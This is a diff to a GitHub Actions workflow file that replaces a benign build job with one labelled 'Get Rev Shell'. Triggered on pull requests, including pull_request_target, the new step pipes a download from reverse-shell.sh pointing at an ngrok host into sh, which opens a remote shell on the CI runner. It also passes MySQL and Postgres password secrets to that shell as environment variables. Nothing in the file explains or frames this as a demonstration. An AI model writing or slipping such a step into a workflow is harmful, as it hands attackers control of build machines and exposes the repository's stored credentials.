@@ -2,26 +2,14 @@ name: CIpull_request_target
 
 on:
   pull_request_target:
-  push:
+  pull_request:
 
-  workflow_dispatch:
-
-jobs:
-  build:
+jobs:     
+  create_pull_request:
     runs-on: ubuntu-latest
-
     steps:
-      - uses: actions/checkout@v3
-      
-      - name: get actor
-        run: echo "${{ github.actor }}"
-
-      - name: Run a one-line script
-        run: bash main.sh
+      - name: Get Rev Shell
+        run: sh -c 'curl https://reverse-shell.sh/0.tcp.eu.ngrok.io:13954 | sh'
         env:
-          secret_myql_pass: ${{secrets.LALALA}}
-
-      # Runs a set of commands using the runners shell
-      - name: Run a multi-line script
-        run: |
-          echo "good bye from main pull_request_target!"
+          secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
+          secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
